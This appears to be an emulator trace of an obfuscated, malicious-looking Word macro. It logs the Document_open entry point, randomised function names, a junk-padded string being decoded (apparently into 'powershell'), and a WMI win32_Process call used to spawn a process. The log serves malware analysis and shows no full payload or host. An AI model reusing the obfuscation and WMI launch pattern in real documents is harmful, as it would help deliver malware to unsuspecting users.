+TRACING VBA CODE (entrypoint = Auto*):
+INFO     Found possible intermediate IOC (URL): 'http://schemas.openxmlformats.org/drawingml/2006/main'
+INFO     Emulating loose statements...
+INFO     ACTION: Found Entry Point - params 'document_open' - 
+INFO     evaluating Sub Document_open
+INFO     Calling Procedure: Lt_l2i5x8f4qw5i.Yulfni6j7ok2f80tqh("''")
+WARNING  Variable 'Lt_l2i5x8f4qw5i' not found
+WARNING  Variable 'OQlZBI' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'M9bws0_cegeo57p5pl' not found
+WARNING  Variable 'HPnDmI' not found
+WARNING  Variable 'oewuADEAJ' not found
+WARNING  Variable 'HPnDmI' not found
+WARNING  Variable 'PDdQtDYPF' not found
+INFO     calling Function: Int([93], {})
+WARNING  Variable 'EKeIAIECa' not found
+WARNING  Variable 'HPnDmI' not found
+WARNING  Variable 'Lt_l2i5x8f4qw5i' not found
+WARNING  Variable 'VPGjLHDB' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'M9bws0_cegeo57p5pl' not found
+WARNING  Variable 'dXLXG' not found
+WARNING  Variable 'ahPIIx' not found
+WARNING  Variable 'dXLXG' not found
+WARNING  Variable 'mfkgFJJ' not found
+INFO     calling Function: Int([3], {})
+WARNING  Variable 'AUXkfIG' not found
+WARNING  Variable 'dXLXG' not found
+WARNING  Variable 'Hj4ujwfpyy8' not found
+WARNING  Variable 'Lt_l2i5x8f4qw5i' not found
+WARNING  Variable 'SdaXJ' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'M9bws0_cegeo57p5pl' not found
+WARNING  Variable 'CzeCFA' not found
+WARNING  Variable 'pDZjCvqX' not found
+WARNING  Variable 'CzeCFA' not found
+WARNING  Variable 'YxSqyCTEG' not found
+INFO     calling Function: Int([7], {})
+WARNING  Variable 'YxigTb' not found
+WARNING  Variable 'CzeCFA' not found
+WARNING  Variable 'Lt_l2i5x8f4qw5i' not found
+WARNING  Variable 'sBzGID' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'M9bws0_cegeo57p5pl' not found
+WARNING  Variable 'rPtjr' not found
+WARNING  Variable 'nRWaUA' not found
+WARNING  Variable 'rPtjr' not found
+WARNING  Variable 'vjvZAWdGD' not found
+INFO     calling Function: Int([5], {})
+WARNING  Variable 'PqpgCTFI' not found
+WARNING  Variable 'rPtjr' not found
+WARNING  Variable 'Hw28kvn3b633x' not found
+WARNING  Variable 'Lt_l2i5x8f4qw5i' not found
+WARNING  Variable 'UTIBUA' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'M9bws0_cegeo57p5pl' not found
+WARNING  Variable 'EipJBhH' not found
+WARNING  Variable 'DhcRuFaCv' not found
+WARNING  Variable 'EipJBhH' not found
+WARNING  Variable 'vZscCOE' not found
+INFO     calling Function: Int([1763], {})
+WARNING  Variable 'qjUZWIH' not found
+WARNING  Variable 'EipJBhH' not found
+WARNING  Variable 'Lt_l2i5x8f4qw5i' not found
+WARNING  Variable 'czRiBBCG' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'M9bws0_cegeo57p5pl' not found
+WARNING  Variable 'PTzRO' not found
+WARNING  Variable 'kIOhAFt' not found
+WARNING  Variable 'PTzRO' not found
+WARNING  Variable 'TdWlAFII' not found
+INFO     calling Function: Int([5096], {})
+WARNING  Variable 'ZZaIGA' not found
+WARNING  Variable 'PTzRO' not found
+WARNING  Variable 'Aqbj3_33ziceoti' not found
+WARNING  Variable 'Lt_l2i5x8f4qw5i' not found
+WARNING  Variable 'NIxifD' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'M9bws0_cegeo57p5pl' not found
+WARNING  Variable 'mItVEzF' not found
+WARNING  Variable 'mmvlJDwGI' not found
+WARNING  Variable 'mItVEzF' not found
+WARNING  Variable 'DlXrEJC' not found
+INFO     calling Function: Int([725], {})
+WARNING  Variable 'SgvbFYAx' not found
+WARNING  Variable 'mItVEzF' not found
+WARNING  Variable 'Lt_l2i5x8f4qw5i' not found
+WARNING  Variable 'MZaWWpBI' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'M9bws0_cegeo57p5pl' not found
+WARNING  Variable 'dOKqFAimb' not found
+WARNING  Variable 'AQaUXGHEc' not found
+WARNING  Variable 'dOKqFAimb' not found
+WARNING  Variable 'hJHRHIG' not found
+INFO     calling Function: Int([562], {})
+WARNING  Variable 'CYPUrBNE' not found
+WARNING  Variable 'dOKqFAimb' not found
+INFO     calling Function: BuildKeyCode(83)
+WARNING  Function 'BuildKeyCode' not found
+WARNING  Variable 'Lt_l2i5x8f4qw5i' not found
+WARNING  Variable 'xJNKmGg' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'M9bws0_cegeo57p5pl' not found
+WARNING  Variable 'NIRHCHUG' not found
+WARNING  Variable 'zOuqIqNF' not found
+WARNING  Variable 'NIRHCHUG' not found
+WARNING  Variable 'wTcPCGGr' not found
+INFO     calling Function: Int([9], {})
+WARNING  Variable 'qQOpyQBw' not found
+WARNING  Variable 'NIRHCHUG' not found
+WARNING  Variable 'Lt_l2i5x8f4qw5i' not found
+WARNING  Variable 'UlOoFkM' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'M9bws0_cegeo57p5pl' not found
+WARNING  Variable 'nJzXD' not found
+WARNING  Variable 'aKeyPG' not found
+WARNING  Variable 'nJzXD' not found
+WARNING  Variable 'FNjqADDHd' not found
+INFO     calling Function: Int([2], {})
+WARNING  Variable 'HfIEmFCE' not found
+WARNING  Variable 'nJzXD' not found
+WARNING  Variable 'Lt_l2i5x8f4qw5i' not found
+WARNING  Variable 'BlyTd' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'M9bws0_cegeo57p5pl' not found
+WARNING  Variable 'vlbxC' not found
+WARNING  Variable 'oiikU' not found
+WARNING  Variable 'vlbxC' not found
+WARNING  Variable 'bqRwA' not found
+INFO     calling Function: Int([9], {})
+WARNING  Variable 'wLuxDpQ' not found
+WARNING  Variable 'vlbxC' not found
+WARNING  Variable 'Lt_l2i5x8f4qw5i' not found
+WARNING  Variable 'kBeEMEizD' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'M9bws0_cegeo57p5pl' not found
+WARNING  Variable 'ihAnl' not found
+WARNING  Variable 'vKucAq' not found
+WARNING  Variable 'ihAnl' not found
+WARNING  Variable 'uodhBLLA' not found
+INFO     calling Function: Int([3], {})
+WARNING  Variable 'aCeIHE' not found
+WARNING  Variable 'ihAnl' not found
+INFO     calling Function: Hs6la7eq2yreh('][ (0 huBJ [] []w][ (0 huBJ [] []ww][ (0 huBJ [] []wi][ (0 huBJ [] []wnm][ (0 h...)
+WARNING  Variable 'Lt_l2i5x8f4qw5i' not found
+WARNING  Variable 'FKRsCaZJ' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'M9bws0_cegeo57p5pl' not found
+WARNING  Variable 'RobwD' not found
+WARNING  Variable 'ccnEYCJJ' not found
+WARNING  Variable 'RobwD' not found
+WARNING  Variable 'FXRUDFzI' not found
+INFO     calling Function: Int([1], {})
+WARNING  Variable 'ikvPTbHJD' not found
+WARNING  Variable 'RobwD' not found
+WARNING  Variable 'Lt_l2i5x8f4qw5i' not found
+WARNING  Variable 'lVPeCLH' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'M9bws0_cegeo57p5pl' not found
+WARNING  Variable 'kMivbHM' not found
+WARNING  Variable 'BnXwVCADJ' not found
+WARNING  Variable 'kMivbHM' not found
+WARNING  Variable 'gCCBA' not found
+INFO     calling Function: Int([10], {})
+WARNING  Variable 'OpGmJkD' not found
+WARNING  Variable 'kMivbHM' not found
+WARNING  Variable 'Lt_l2i5x8f4qw5i' not found
+WARNING  Variable 'onazcGHG' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'M9bws0_cegeo57p5pl' not found
+WARNING  Variable 'UviiCJt' not found
+WARNING  Variable 'yaPEJZm' not found
+WARNING  Variable 'UviiCJt' not found
+WARNING  Variable 'vrMQuI' not found
+INFO     calling Function: Int([8], {})
+WARNING  Variable 'iFUDE' not found
+WARNING  Variable 'UviiCJt' not found
+WARNING  Variable 'Lt_l2i5x8f4qw5i' not found
+WARNING  Variable 'ypjbIafu' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'M9bws0_cegeo57p5pl' not found
+WARNING  Variable 'zZMDFSAqb' not found
+WARNING  Variable 'HLIXTr' not found
+WARNING  Variable 'zZMDFSAqb' not found
+WARNING  Variable 'hYeFCmJn' not found
+INFO     calling Function: Int([3027], {})
+WARNING  Variable 'ldGLJb' not found
+WARNING  Variable 'zZMDFSAqb' not found
+WARNING  Variable 'B5kxad2f6a9l2wec' not found
+INFO     calling Function: Nlpfpcsbssrm8y('][ (0 huBJ [] []w][ (0 huBJ [] []ww][ (0 huBJ [] []wi][ (0 huBJ [] []wnm][ (0 h...)
+WARNING  Variable 'Lt_l2i5x8f4qw5i' not found
+WARNING  Variable 'tesVJjZBm' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'M9bws0_cegeo57p5pl' not found
+WARNING  Variable 'fxhVJDiGu' not found
+WARNING  Variable 'UUDADE' not found
+WARNING  Variable 'fxhVJDiGu' not found
+WARNING  Variable 'jZGaAv' not found
+INFO     calling Function: Int([3], {})
+WARNING  Variable 'AANxPGAC' not found
+WARNING  Variable 'fxhVJDiGu' not found
+WARNING  Variable 'Lt_l2i5x8f4qw5i' not found
+WARNING  Variable 'ZPZoX' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'M9bws0_cegeo57p5pl' not found
+WARNING  Variable 'uWoAZE' not found
+WARNING  Variable 'NiKKI' not found
+WARNING  Variable 'uWoAZE' not found
+WARNING  Variable 'OghWI' not found
+INFO     calling Function: Int([96], {})
+WARNING  Variable 'mICRC' not found
+WARNING  Variable 'uWoAZE' not found
+WARNING  Variable 'Y0buszs_jp_hoe' not found
+INFO     calling Function: Replace('][ (0 huBJ [] []w][ (0 huBJ [] []ww][ (0 huBJ [] []wi][ (0 huBJ [] []wnm][ (0 h...)
+WARNING  Variable 'EHvkO' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'M9bws0_cegeo57p5pl' not found
+WARNING  Variable 'JlrdGDHBJ' not found
+WARNING  Variable 'VQalCkIB' not found
+WARNING  Variable 'JlrdGDHBJ' not found
+WARNING  Variable 'vHMbJ' not found
+INFO     calling Function: Int([9534], {})
+WARNING  Variable 'gjFABo' not found
+WARNING  Variable 'JlrdGDHBJ' not found
+WARNING  Variable 'blnYADd' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'nEkUIRGFD' not found
+WARNING  Variable 'AuAejI' not found
+WARNING  Variable 'nEkUIRGFD' not found
+WARNING  Variable 'PTlyI' not found
+INFO     calling Function: Int([7], {})
+WARNING  Variable 'ZvHnJnEK' not found
+WARNING  Variable 'nEkUIRGFD' not found
+WARNING  Variable 'HOUwnBu' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'QoThGd' not found
+WARNING  Variable 'TlUjhLLJA' not found
+WARNING  Variable 'QoThGd' not found
+WARNING  Variable 'WJvBCKHID' not found
+INFO     calling Function: Int([6], {})
+WARNING  Variable 'dUUaCoAF' not found
+WARNING  Variable 'QoThGd' not found
+WARNING  Variable 'KpBuSD' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'TvJbksC' not found
+WARNING  Variable 'CbNRHyiAC' not found
+WARNING  Variable 'TvJbksC' not found
+WARNING  Variable 'KUjbsE' not found
+INFO     calling Function: Int([1], {})
+WARNING  Variable 'hrBsJDH' not found
+WARNING  Variable 'TvJbksC' not found
+WARNING  Variable 'rKkPEN' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'ufQvJSj' not found
+WARNING  Variable 'GLdxBp' not found
+WARNING  Variable 'ufQvJSj' not found
+WARNING  Variable 'FZxFN' not found
+INFO     calling Function: Int([543], {})
+WARNING  Variable 'DhVOC' not found
+WARNING  Variable 'ufQvJSj' not found
+WARNING  Variable 'LpewHGFAD' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'TnpeIEI' not found
+WARNING  Variable 'bFSOZEHfH' not found
+WARNING  Variable 'TnpeIEI' not found
+WARNING  Variable 'EDWgzFhEr' not found
+INFO     calling Function: Int([1], {})
+WARNING  Variable 'xIFYIJfEA' not found
+WARNING  Variable 'TnpeIEI' not found
+WARNING  Variable 'AvsuDTHBw' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'xPcbIK' not found
+WARNING  Variable 'vxvfaFI' not found
+WARNING  Variable 'xPcbIK' not found
+WARNING  Variable 'YtXkA' not found
+INFO     calling Function: Int([414], {})
+WARNING  Variable 'sDjRA' not found
+WARNING  Variable 'xPcbIK' not found
+WARNING  Variable 'jWXOG' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'wjWhJHtmC' not found
+WARNING  Variable 'RroKknGF' not found
+WARNING  Variable 'wjWhJHtmC' not found
+WARNING  Variable 'XMaURWYJ' not found
+INFO     calling Function: Int([5], {})
+WARNING  Variable 'iiEmIGziA' not found
+WARNING  Variable 'wjWhJHtmC' not found
+INFO     calling Function: CreateObject('winmgmt\x00:win32_Process')
+INFO     ACTION: CreateObject - params ['winmgmt:win32_Process'] - Interesting Function Call
+WARNING  Variable 'pVjSJB' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'kuXzSso' not found
+WARNING  Variable 'lZPBh' not found
+WARNING  Variable 'kuXzSso' not found
+WARNING  Variable 'CMOhC' not found
+INFO     calling Function: Int([2], {})
+WARNING  Variable 'kcJJADM' not found
+WARNING  Variable 'kuXzSso' not found
+WARNING  Variable 'WWAUF' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'lTVMDCqHJ' not found
+WARNING  Variable 'qtmzGtxG' not found
+WARNING  Variable 'lTVMDCqHJ' not found
+WARNING  Variable 'MpZewJ' not found
+INFO     calling Function: Int([1], {})
+WARNING  Variable 'tcDtJEH' not found
+WARNING  Variable 'lTVMDCqHJ' not found
+WARNING  Variable 'Htqbdi3x0p1bpx7' not found
+INFO     calling Function: CVar('][ (0 huBJ [] []wpo][ (0 huBJ [] []wwe][ (0 huBJ [] []wrs][ (0 huBJ [] []whe][ ...)
+INFO     calling Function: Mid('][ (0 huBJ [] []wpo][ (0 huBJ [] []wwe][ (0 huBJ [] []wrs][ (0 huBJ [] []whe][ ...)
+WARNING  Variable 'DnueC' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'pYmyg' not found
+WARNING  Variable 'OnbANufFf' not found
+WARNING  Variable 'pYmyg' not found
+WARNING  Variable 'NQdyCZrM' not found
+INFO     calling Function: Int([7865], {})
+WARNING  Variable 'qyjhJIEnJ' not found
+WARNING  Variable 'pYmyg' not found
+WARNING  Variable 'PkWNL' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'IyPulFI' not found
+WARNING  Variable 'zhNpFAEdB' not found
+WARNING  Variable 'IyPulFI' not found
+WARNING  Variable 'KHRTFGIA' not found
+INFO     calling Function: Int([360], {})
+WARNING  Variable 'nWJbm' not found
+WARNING  Variable 'IyPulFI' not found
+WARNING  Variable 'Kmnb_n824uhj_p' not found
+WARNING  Variable 'kPXrFrDSC' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'VNRALdGHB' not found
+WARNING  Variable 'ShJoxI' not found
+WARNING  Variable 'VNRALdGHB' not found
+WARNING  Variable 'HQVlBG' not found
+INFO     calling Function: Int([6], {})
+WARNING  Variable 'PuAFaHJC' not found
+WARNING  Variable 'VNRALdGHB' not found
+WARNING  Variable 'EsTNlaIFC' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'rGgzOCoG' not found
+WARNING  Variable 'PCGYWuUE' not found
+WARNING  Variable 'rGgzOCoG' not found
+WARNING  Variable 'DohMb' not found
+INFO     calling Function: Int([6], {})
+WARNING  Variable 'rLScA' not found
+WARNING  Variable 'rGgzOCoG' not found
+INFO     calling Function: Mzj4a1lpxlocl6w('winmgmt\x00:win32_Process\x00][ (0 huBJ [] []wtar][ (0 huBJ [] []w][ (0 huBJ []...)
+WARNING  Variable 'rvqUEGExE' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'vfclyGk' not found
+WARNING  Variable 'LYefHFL' not found
+WARNING  Variable 'vfclyGk' not found
+WARNING  Variable 'fsJPAvE' not found
+INFO     calling Function: Int([4], {})
+WARNING  Variable 'vyiMV' not found
+WARNING  Variable 'vfclyGk' not found
+WARNING  Variable 'BPEQdEA' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'AarGF' not found
+WARNING  Variable 'RuXGg' not found
+WARNING  Variable 'AarGF' not found
+WARNING  Variable 'ZuWxGI' not found
+INFO     calling Function: Int([23], {})
+WARNING  Variable 'fjnWi' not found
+WARNING  Variable 'AarGF' not found
+WARNING  Variable 'B5kxad2f6a9l2wec' not found
+WARNING  Variable 'E6uxrppvvxtk' not found
+WARNING  Variable 'G3t3j2bg18ta0r' not found
+INFO     calling Function: Hs6la7eq2yreh('winmgmt\x00:win32_Process\x00][ (0 huBJ [] []wtar][ (0 huBJ [] []w][ (0 huBJ []...)
+WARNING  Variable 'FKRsCaZJ' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'RobwD' not found
+WARNING  Variable 'ccnEYCJJ' not found
+WARNING  Variable 'RobwD' not found
+WARNING  Variable 'FXRUDFzI' not found
+INFO     calling Function: Int([1], {})
+WARNING  Variable 'ikvPTbHJD' not found
+WARNING  Variable 'RobwD' not found
+WARNING  Variable 'lVPeCLH' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'kMivbHM' not found
+WARNING  Variable 'BnXwVCADJ' not found
+WARNING  Variable 'kMivbHM' not found
+WARNING  Variable 'gCCBA' not found
+INFO     calling Function: Int([10], {})
+WARNING  Variable 'OpGmJkD' not found
+WARNING  Variable 'kMivbHM' not found
+WARNING  Variable 'onazcGHG' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'UviiCJt' not found
+WARNING  Variable 'yaPEJZm' not found
+WARNING  Variable 'UviiCJt' not found
+WARNING  Variable 'vrMQuI' not found
+INFO     calling Function: Int([8], {})
+WARNING  Variable 'iFUDE' not found
+WARNING  Variable 'UviiCJt' not found
+WARNING  Variable 'ypjbIafu' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'zZMDFSAqb' not found
+WARNING  Variable 'HLIXTr' not found
+WARNING  Variable 'zZMDFSAqb' not found
+WARNING  Variable 'hYeFCmJn' not found
+INFO     calling Function: Int([3027], {})
+WARNING  Variable 'ldGLJb' not found
+WARNING  Variable 'zZMDFSAqb' not found
+WARNING  Variable 'B5kxad2f6a9l2wec' not found
+INFO     calling Function: Nlpfpcsbssrm8y('winmgmt\x00:win32_Process\x00][ (0 huBJ [] []wtar][ (0 huBJ [] []w][ (0 huBJ []...)
+WARNING  Variable 'tesVJjZBm' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'fxhVJDiGu' not found
+WARNING  Variable 'UUDADE' not found
+WARNING  Variable 'fxhVJDiGu' not found
+WARNING  Variable 'jZGaAv' not found
+INFO     calling Function: Int([3], {})
+WARNING  Variable 'AANxPGAC' not found
+WARNING  Variable 'fxhVJDiGu' not found
+WARNING  Variable 'ZPZoX' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'uWoAZE' not found
+WARNING  Variable 'NiKKI' not found
+WARNING  Variable 'uWoAZE' not found
+WARNING  Variable 'OghWI' not found
+INFO     calling Function: Int([96], {})
+WARNING  Variable 'mICRC' not found
+WARNING  Variable 'uWoAZE' not found
+WARNING  Variable 'Y0buszs_jp_hoe' not found
+INFO     calling Function: Replace('winmgmt\x00:win32_Process\x00][ (0 huBJ [] []wtar][ (0 huBJ [] []w][ (0 huBJ []...)
+WARNING  Variable 'EHvkO' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'JlrdGDHBJ' not found
+WARNING  Variable 'VQalCkIB' not found
+WARNING  Variable 'JlrdGDHBJ' not found
+WARNING  Variable 'vHMbJ' not found
+INFO     calling Function: Int([9534], {})
+WARNING  Variable 'gjFABo' not found
+WARNING  Variable 'JlrdGDHBJ' not found
+WARNING  Variable 'blnYADd' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'nEkUIRGFD' not found
+WARNING  Variable 'AuAejI' not found
+WARNING  Variable 'nEkUIRGFD' not found
+WARNING  Variable 'PTlyI' not found
+INFO     calling Function: Int([7], {})
+WARNING  Variable 'ZvHnJnEK' not found
+WARNING  Variable 'nEkUIRGFD' not found
+WARNING  Variable 'HOUwnBu' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'QoThGd' not found
+WARNING  Variable 'TlUjhLLJA' not found
+WARNING  Variable 'QoThGd' not found
+WARNING  Variable 'WJvBCKHID' not found
+INFO     calling Function: Int([6], {})
+WARNING  Variable 'dUUaCoAF' not found
+WARNING  Variable 'QoThGd' not found
+WARNING  Variable 'KpBuSD' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'TvJbksC' not found
+WARNING  Variable 'CbNRHyiAC' not found
+WARNING  Variable 'TvJbksC' not found
+WARNING  Variable 'KUjbsE' not found
+INFO     calling Function: Int([1], {})
+WARNING  Variable 'hrBsJDH' not found
+WARNING  Variable 'TvJbksC' not found
+WARNING  Variable 'rKkPEN' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'ufQvJSj' not found
+WARNING  Variable 'GLdxBp' not found
+WARNING  Variable 'ufQvJSj' not found
+WARNING  Variable 'FZxFN' not found
+INFO     calling Function: Int([543], {})
+WARNING  Variable 'DhVOC' not found
+WARNING  Variable 'ufQvJSj' not found
+WARNING  Variable 'LpewHGFAD' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'TnpeIEI' not found
+WARNING  Variable 'bFSOZEHfH' not found
+WARNING  Variable 'TnpeIEI' not found
+WARNING  Variable 'EDWgzFhEr' not found
+INFO     calling Function: Int([1], {})
+WARNING  Variable 'xIFYIJfEA' not found
+WARNING  Variable 'TnpeIEI' not found
+WARNING  Variable 'E6uxrppvvxtk' not found
+WARNING  Variable 'G3t3j2bg18ta0r' not found
+INFO     calling Function: Hs6la7eq2yreh('winmgmt\x00:win32_Process\x00][ (0 huBJ [] []wtar][ (0 huBJ [] []w][ (0 huBJ []...)
+WARNING  Variable 'FKRsCaZJ' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'RobwD' not found
+WARNING  Variable 'ccnEYCJJ' not found
+WARNING  Variable 'RobwD' not found
+WARNING  Variable 'FXRUDFzI' not found
+INFO     calling Function: Int([1], {})
+WARNING  Variable 'ikvPTbHJD' not found
+WARNING  Variable 'RobwD' not found
+WARNING  Variable 'lVPeCLH' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'kMivbHM' not found
+WARNING  Variable 'BnXwVCADJ' not found
+WARNING  Variable 'kMivbHM' not found
+WARNING  Variable 'gCCBA' not found
+INFO     calling Function: Int([10], {})
+WARNING  Variable 'OpGmJkD' not found
+WARNING  Variable 'kMivbHM' not found
+WARNING  Variable 'onazcGHG' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'UviiCJt' not found
+WARNING  Variable 'yaPEJZm' not found
+WARNING  Variable 'UviiCJt' not found
+WARNING  Variable 'vrMQuI' not found
+INFO     calling Function: Int([8], {})
+WARNING  Variable 'iFUDE' not found
+WARNING  Variable 'UviiCJt' not found
+WARNING  Variable 'ypjbIafu' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'zZMDFSAqb' not found
+WARNING  Variable 'HLIXTr' not found
+WARNING  Variable 'zZMDFSAqb' not found
+WARNING  Variable 'hYeFCmJn' not found
+INFO     calling Function: Int([3027], {})
+WARNING  Variable 'ldGLJb' not found
+WARNING  Variable 'zZMDFSAqb' not found
+WARNING  Variable 'B5kxad2f6a9l2wec' not found
+INFO     calling Function: Nlpfpcsbssrm8y('winmgmt\x00:win32_Process\x00][ (0 huBJ [] []wtar][ (0 huBJ [] []w][ (0 huBJ []...)
+WARNING  Variable 'tesVJjZBm' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'fxhVJDiGu' not found
+WARNING  Variable 'UUDADE' not found
+WARNING  Variable 'fxhVJDiGu' not found
+WARNING  Variable 'jZGaAv' not found
+INFO     calling Function: Int([3], {})
+WARNING  Variable 'AANxPGAC' not found
+WARNING  Variable 'fxhVJDiGu' not found
+WARNING  Variable 'ZPZoX' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'uWoAZE' not found
+WARNING  Variable 'NiKKI' not found
+WARNING  Variable 'uWoAZE' not found
+WARNING  Variable 'OghWI' not found
+INFO     calling Function: Int([96], {})
+WARNING  Variable 'mICRC' not found
+WARNING  Variable 'uWoAZE' not found
+WARNING  Variable 'Y0buszs_jp_hoe' not found
+INFO     calling Function: Replace('winmgmt\x00:win32_Process\x00][ (0 huBJ [] []wtar][ (0 huBJ [] []w][ (0 huBJ []...)
+WARNING  Variable 'EHvkO' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'JlrdGDHBJ' not found
+WARNING  Variable 'VQalCkIB' not found
+WARNING  Variable 'JlrdGDHBJ' not found
+WARNING  Variable 'vHMbJ' not found
+INFO     calling Function: Int([9534], {})
+WARNING  Variable 'gjFABo' not found
+WARNING  Variable 'JlrdGDHBJ' not found
+WARNING  Variable 'blnYADd' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'nEkUIRGFD' not found
+WARNING  Variable 'AuAejI' not found
+WARNING  Variable 'nEkUIRGFD' not found
+WARNING  Variable 'PTlyI' not found
+INFO     calling Function: Int([7], {})
+WARNING  Variable 'ZvHnJnEK' not found
+WARNING  Variable 'nEkUIRGFD' not found
+WARNING  Variable 'HOUwnBu' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'QoThGd' not found
+WARNING  Variable 'TlUjhLLJA' not found
+WARNING  Variable 'QoThGd' not found
+WARNING  Variable 'WJvBCKHID' not found
+INFO     calling Function: Int([6], {})
+WARNING  Variable 'dUUaCoAF' not found
+WARNING  Variable 'QoThGd' not found
+WARNING  Variable 'KpBuSD' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'TvJbksC' not found
+WARNING  Variable 'CbNRHyiAC' not found
+WARNING  Variable 'TvJbksC' not found
+WARNING  Variable 'KUjbsE' not found
+INFO     calling Function: Int([1], {})
+WARNING  Variable 'hrBsJDH' not found
+WARNING  Variable 'TvJbksC' not found
+WARNING  Variable 'rKkPEN' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'ufQvJSj' not found
+WARNING  Variable 'GLdxBp' not found
+WARNING  Variable 'ufQvJSj' not found
+WARNING  Variable 'FZxFN' not found
+INFO     calling Function: Int([543], {})
+WARNING  Variable 'DhVOC' not found
+WARNING  Variable 'ufQvJSj' not found
+WARNING  Variable 'LpewHGFAD' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'TnpeIEI' not found
+WARNING  Variable 'bFSOZEHfH' not found
+WARNING  Variable 'TnpeIEI' not found
+WARNING  Variable 'EDWgzFhEr' not found
+INFO     calling Function: Int([1], {})
+WARNING  Variable 'xIFYIJfEA' not found
+WARNING  Variable 'TnpeIEI' not found
+INFO     calling Function: Ug5ciccd4cghfy('winmgmt\x00:win32_Process\x00tartuP')
+WARNING  Variable 'gecAKF' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'lBIWBcB' not found
+WARNING  Variable 'xCOKDHCH' not found
+WARNING  Variable 'lBIWBcB' not found
+WARNING  Variable 'BGDCyAvkv' not found
+INFO     calling Function: Int([96], {})
+WARNING  Variable 'EweYVEJB' not found
+WARNING  Variable 'lBIWBcB' not found
+WARNING  Variable 'tfnoJLtS' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'BdVMCE' not found
+WARNING  Variable 'wovLOvT' not found
+WARNING  Variable 'BdVMCE' not found
+WARNING  Variable 'IDQoWBJR' not found
+INFO     calling Function: Int([8], {})
+WARNING  Variable 'wGkuKFAEd' not found
+WARNING  Variable 'BdVMCE' not found
